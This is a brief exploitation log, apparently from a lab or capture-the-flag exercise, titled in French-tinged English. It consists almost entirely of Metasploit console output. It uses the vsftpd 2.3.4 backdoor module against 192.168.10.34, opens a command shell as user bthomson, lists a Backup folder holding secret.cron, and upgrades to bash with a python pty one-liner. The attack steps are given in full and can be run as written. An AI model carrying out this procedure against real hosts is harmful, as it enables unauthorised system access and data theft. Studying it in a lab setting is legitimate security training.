# Exploitation vsFTPd

```
┌──(clehen38㉿kali)-[~]                                                                            
└─$ msfconsole                                                                                     
                                                                                                   
                                   ____________                                                    
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                    
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                    
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]                    
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]                    
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]                    
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]                    
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]                    
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                    
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                    
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                    
                                                                                                   

       =[ metasploit v6.0.21-dev                          ]
+ -- --=[ 2084 exploits - 1126 auxiliary - 354 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]



msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor                                                                                        

msf6 > 

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
                                                                                                                       
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.10.34
rhosts => 192.168.10.34                                                                                          
                                                                                                                       
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.10.34:21 - The port used by the backdoor bind listener is already open
[+] 192.168.10.34:21 - UID: uid=1000(bthomson) gid=1000(bthomson) groups=1000(bthomson),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
[*] Found shell.
[*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.10.34:6200) at 2023-09-13 12:27:10 +0000

ls
Backup
Program
tools

cd Backup
ls
secret.cron
sonde.tar
sonde.tar.gz

cd
whoami
bthomson


python -c "import pty;pty.spawn('/bin/bash')"
bthomson@Invictus-Bank:~$ 

Autre méthode de récupération d'un shell :
pwd
/home/bthomson


shell
[*] Trying to find binary(python) on target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary(bash) on target machine
[*] Found bash at /bin/bash





```
